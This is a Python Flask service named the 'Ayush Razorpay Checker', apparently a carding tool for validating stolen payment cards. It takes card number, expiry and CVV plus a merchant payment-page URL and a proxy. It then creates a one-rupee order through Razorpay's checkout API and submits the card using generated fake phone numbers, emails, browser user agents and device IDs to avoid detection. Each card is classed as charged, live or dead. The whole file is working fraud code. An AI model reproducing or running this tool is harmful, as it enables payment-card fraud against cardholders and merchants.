import json
import random
import re
import hashlib
import time
import logging
import os
from typing import Tuple, Dict
from urllib.parse import urlencode

import requests
from flask import Flask, request, jsonify

app = Flask(__name__)

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

def rand_int(min_val: int, max_val: int) -> int:
    return random.randint(min_val, max_val)

def gen_ua() -> str:
    major = rand_int(120, 147)
    build = rand_int(5000, 6999)
    patch = rand_int(50, 249)
    return f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{major}.0.{build}.{patch} Safari/537.36"

def gen_indian_phone() -> Tuple[str, str]:
    first = random.choice(["6", "7", "8", "9"])
    rest = ''.join(str(rand_int(0, 9)) for _ in range(9))
    full = f"+91{first}{rest}"
    short = full[3:]
    return full, short

def gen_email() -> str:
    names = ["alex", "john", "mike", "sara", "david", "emma", "james", "lisa"]
    return f"{random.choice(names)}{rand_int(100, 9999)}@gmail.com"

def get_brand(cc: str) -> str:
    if cc.startswith("4"):
        return "visa"
    if len(cc) >= 2 and cc[:2] in ["51", "52", "53", "54", "55"]:
        return "mastercard"
    if cc.startswith("34") or cc.startswith("37"):
        return "amex"
    return "visa"

def find_between(content: str, start: str, end: str) -> str:
    si = content.find(start)
    if si == -1:
        return ""
    si += len(start)
    ei = content[si:].find(end)
    if ei == -1:
        return ""
    return content[si:si+ei]

def extract_json_var(content: str, var_name: str) -> str:
    prefix = f"var {var_name} ="
    start_idx = content.find(prefix)
    if start_idx == -1:
        return ""
    start_idx += len(prefix)
    while start_idx < len(content) and content[start_idx] in ' \t\n\r':
        start_idx += 1
    if start_idx >= len(content) or content[start_idx] != '{':
        return ""
    
    depth = 0
    in_string = False
    escaped = False
    for i in range(start_idx, len(content)):
        c = content[i]
        if escaped:
            escaped = False
            continue
        if c == '\\' and in_string:
            escaped = True
            continue
        if c == '"':
            in_string = not in_string
            continue
        if in_string:
            continue
        if c == '{':
            depth += 1
        elif c == '}':
            depth -= 1
            if depth == 0:
                return content[start_idx:i+1]
    return ""

def generate_rzp_device_id() -> Tuple[str, str]:
    rand_bytes = os.urandom(16)  # Fixed: random.randbytes -> os.urandom
    h = hashlib.sha1(rand_bytes).hexdigest()
    ts = str(int(time.time() * 1000))
    rnd = f"{rand_int(0, 99999999):08d}"
    return f"1.{h}.{ts}.{rnd}", h

def do_request(target_url: str, proxy_url: str, ua: str) -> Tuple[str, int]:
    proxies = None
    if proxy_url:
        proxies = {"http": proxy_url, "https": proxy_url}
    
    headers = {
        "User-Agent": ua,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9"
    }
    
    resp = requests.get(target_url, headers=headers, proxies=proxies, timeout=45, verify=False)
    return resp.text, resp.status_code

def do_post_form(target_url: str, proxy_url: str, ua: str, form_data: Dict[str, str]) -> Tuple[str, int]:
    proxies = None
    if proxy_url:
        proxies = {"http": proxy_url, "https": proxy_url}
    
    headers = {
        "User-Agent": ua,
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json, text/plain, */*"
    }
    
    resp = requests.post(target_url, data=form_data, headers=headers, proxies=proxies, timeout=45, verify=False)
    return resp.text, resp.status_code

def do_post_json(target_url: str, proxy_url: str, ua: str, json_payload: str) -> Tuple[str, int]:
    proxies = None
    if proxy_url:
        proxies = {"http": proxy_url, "https": proxy_url}
    
    headers = {
        "User-Agent": ua,
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*"
    }
    
    resp = requests.post(target_url, data=json_payload, headers=headers, proxies=proxies, timeout=45, verify=False)
    return resp.text, resp.status_code

def check_card(cc: str, mm: str, yy: str, cvv: str, proxy_url: str, target_url: str) -> Tuple[str, str]:
    yy2 = yy if len(yy) == 2 else yy[2:]
    year = int(f"20{yy2}")
    ua = gen_ua()
    phone, phone_short = gen_indian_phone()
    email = gen_email()
    rzp_device_id, fhash = generate_rzp_device_id()
    
    # Step 1: Get payment page
    body, status = do_request(target_url, proxy_url, ua)
    if status != 200:
        return "error", f"HTTP {status} - Page not accessible"
    
    json_str = extract_json_var(body, "data")
    if not json_str:
        return "error", "Razorpay data not found on page"
    
    try:
        init_data = json.loads(json_str)
    except:
        return "error", "Failed to parse Razorpay data"
    
    kyid = init_data.get("key_id") or init_data.get("key")
    if not kyid:
        return "error", "Key ID not found"
    
    plink = ""
    ppid = ""
    
    if "payment_link" in init_data and isinstance(init_data["payment_link"], dict):
        plink = init_data["payment_link"].get("id", "")
        items = init_data["payment_link"].get("payment_page_items", [])
        if items and isinstance(items[0], dict):
            ppid = items[0].get("id", "")
    elif "payment_page" in init_data and isinstance(init_data["payment_page"], dict):
        plink = init_data["payment_page"].get("id", "")
        items = init_data["payment_page"].get("payment_page_items", [])
        if items and isinstance(items[0], dict):
            ppid = items[0].get("id", "")
    
    if not plink:
        return "error", "Payment link not found"
    
    keyless_header = init_data.get("keyless_header", "")
    
    # Step 2: Create order
    order_payload = json.dumps({
        "notes": {"comment": "", "name": "User"},
        "line_items": [{"payment_page_item_id": ppid, "amount": 100}]
    })
    
    order_body, _ = do_post_json(
        f"https://api.razorpay.com/v1/payment_pages/{plink}/order",
        proxy_url, ua, order_payload
    )
    
    try:
        order_data = json.loads(order_body)
    except:
        return "error", "Failed to parse order response"
    
    order_obj = order_data.get("order", {})
    order_id = order_obj.get("id") if isinstance(order_obj, dict) else ""
    
    if not order_id:
        err_obj = order_data.get("error", {})
        if isinstance(err_obj, dict):
            desc = err_obj.get("description", "")
            if desc:
                return "error", desc
        return "error", "Order creation failed"
    
    checkout_id = order_id.split("_", 1)[1] if "_" in order_id else order_id
    order_amount = 100.0
    order_currency = "INR"
    
    # Step 3: Get session token
    params3 = {
        "traffic_env": "production",
        "build": "9cb57fdf457e44eac4384e182f925070ff5488d9",
        "checkout_v2": "1",
        "new_session": "1",
        "keyless_header": keyless_header,
        "rzp_device_id": rzp_device_id
    }
    
    sess_body, _ = do_request(
        f"https://api.razorpay.com/v1/checkout/public?{urlencode(params3)}",
        proxy_url, ua
    )
    
    sessid = find_between(sess_body, 'window.session_token="', '";')
    if not sessid:
        match = re.search(r"session_token['\"]?\s*[:=]\s*['\"]([A-F0-9]{40,})['\"]", sess_body)
        if match:
            sessid = match.group(1)
    
    if not sessid:
        return "error", "Session token not found"
    
    # Step 4: Submit card payment
    form7 = {
        "notes[email]": email,
        "notes[phone]": phone_short,
        "payment_link_id": plink,
        "key_id": kyid,
        "contact": phone,
        "email": email,
        "currency": order_currency,
        "_[device.id]": rzp_device_id,
        "_[shield][fhash]": fhash,
        "_[device_id]": rzp_device_id,
        "amount": f"{order_amount:.0f}",
        "order_id": order_id,
        "method": "card",
        "checkout_id": checkout_id,
        "card[number]": cc,
        "card[cvv]": cvv,
        "card[name]": "User",
        "card[expiry_month]": mm,
        "card[expiry_year]": str(year),
        "save": "0"
    }
    
    payment_url = f"https://api.razorpay.com/v1/standard_checkout/payments/create/ajax?x_entity_id={order_id}&session_token={sessid}&keyless_header={keyless_header}"
    payment_body, _ = do_post_form(payment_url, proxy_url, ua, form7)
    
    try:
        payment_data = json.loads(payment_body)
    except:
        return "error", "Failed to parse payment response"
    
    payment_id = payment_data.get("payment_id") or payment_data.get("id")
    
    if not payment_id:
        err_obj = payment_data.get("error", {})
        err_desc = err_obj.get("description", "") if isinstance(err_obj, dict) else ""
        err_desc = re.sub(r" Try another payment method or contact your bank for details\.", "", err_desc).strip()
        err_code = err_obj.get("reason", "") if isinstance(err_obj, dict) else ""
        
        msg_lower = err_desc.lower()
        
        if "insufficient" in msg_lower:
            return "approved", err_desc
        if "cvv" in msg_lower or err_code == "incorrect_cvv":
            return "approved", err_desc
        if "international" in msg_lower:
            return "approved", err_desc
        if "declined" in msg_lower:
            return "declined", err_desc
        
        return "declined", err_desc
    
    # Step 5: Cancel to get final status
    cancel_url = f"https://api.razorpay.com/v1/standard_checkout/payments/{payment_id}/cancel?key_id={kyid}&session_token={sessid}&keyless_header={keyless_header}"
    cancel_body, _ = do_request(cancel_url, proxy_url, ua)
    
    if "razorpay_payment_id" in cancel_body:
        return "charged", "Payment successful - money charged"
    
    try:
        cancel_data = json.loads(cancel_body)
        err_obj = cancel_data.get("error", {})
        if isinstance(err_obj, dict):
            err_desc = err_obj.get("description", "")
            if "insufficient" in err_desc.lower():
                return "approved", err_desc
    except:
        pass
    
    return "approved", "Card is live - authorization successful"

@app.route("/Ayush", methods=["GET", "POST"])
def ayush_handler():
    if request.method == "GET":
        cc = request.args.get("cc", "")
        site = request.args.get("site", "")
        proxy = request.args.get("proxy", "")
    else:
        cc = request.form.get("cc", "")
        site = request.form.get("site", "")
        proxy = request.form.get("proxy", "")
    
    if not cc:
        return jsonify({
            "status": "dead",
            "response": "Missing cc parameter",
            "amount": "-",
            "gateway": "Razorpay",
            "code": ""
        })
    
    parts = cc.split("|")
    if len(parts) != 4:
        return jsonify({
            "status": "dead",
            "response": "Invalid format. Use: card|mm|yy|cvv",
            "amount": "-",
            "gateway": "Razorpay",
            "code": ""
        })
    
    card_num, month, year, cvv = parts
    
    if not site:
        return jsonify({
            "status": "dead",
            "response": "Missing site parameter",
            "amount": "-",
            "gateway": "Razorpay",
            "code": ""
        })
    
    if not proxy:
        return jsonify({
            "status": "dead",
            "response": "Missing proxy parameter",
            "amount": "-",
            "gateway": "Razorpay",
            "code": ""
        })
    
    display_card = card_num[:min(6, len(card_num))]
    logger.info(f"[CHECK] Card: {display_card}**** | Month: {month} | Year: {year} | Site: {site}")
    
    status, message = check_card(card_num, month, year, cvv, proxy, site)
    
    if status == "charged":
        bot_status = "charged"
        amount = "1.00"
        logger.info(f"[RESULT]  CHARGED - {message}")
    elif status == "approved":
        bot_status = "approved"
        amount = "1.00"
        logger.info(f"[RESULT]  APPROVED - {message}")
    elif status == "declined":
        bot_status = "dead"
        amount = "-"
        logger.info(f"[RESULT]  DECLINED - {message}")
    else:
        bot_status = "dead"
        amount = "-"
        logger.info(f"[RESULT]  ERROR - {message}")
    
    return jsonify({
        "status": bot_status,
        "response": message,
        "amount": amount,
        "gateway": "Razorpay",
        "code": ""
    })

@app.route("/", methods=["GET"])
def root():
    return jsonify({
        "name": "Ayush Razorpay Checker",
        "endpoint": "/Ayush",
        "usage": "/Ayush?cc=card|mm|yy|cvv&site=URL&proxy=PROXY",
        "status": "running",
        "note": "Use with proxy for best results"
    })

def min(a, b):
    return a if a < b else b

# This is for Gunicorn (Render)
# No if __name__ block needed for Render
# Gunicorn will use the 'app' variable directly